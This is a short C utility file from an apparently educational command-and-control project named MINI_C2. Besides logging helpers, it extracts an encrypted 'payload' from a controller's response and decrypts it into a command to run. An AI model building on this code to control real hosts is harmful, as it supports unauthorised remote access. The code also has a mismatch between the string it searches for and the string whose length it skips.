#include "ft_util.h"

void	errprint(const char *name, const char *error)
{
	fprintf(stderr, "[MINI_C2] (%s): Error: %s\n", name, error);
}

void	logme(int istittle, const char *message)
{
	if (istittle)
		fprintf(stdout, "[MINI_C2] %s\n", message);
	else
		fprintf(stdout, "%s\n", message);
}

char	*parse_response(const char *response, const unsigned char *key)
{
	char	*start;
	char	*end;
	char	*decrypted_command;

	start = ft_strnstr(response, "\"payload\": \"", ft_strlen(response));
	if (!start)
	{
		errprint("parse_response", "failed to find start of payload in response");
		return (NULL);
	}
	start += ft_strlen("\"payload\" :\"");
	end = ft_strchr(start, '"');
	if (!end)
	{
		errprint("parse_response", "failed to find end of payload");
		return (NULL);
	}
	*end = '\0';

	decrypted_command = ft_decrypt_from_b64(start, key);
	if (!decrypted_command)
	{
		errprint("ft_decrypt_from_b64", "failed to decrypt command");
		return (NULL);
	}
	return (decrypted_command);
}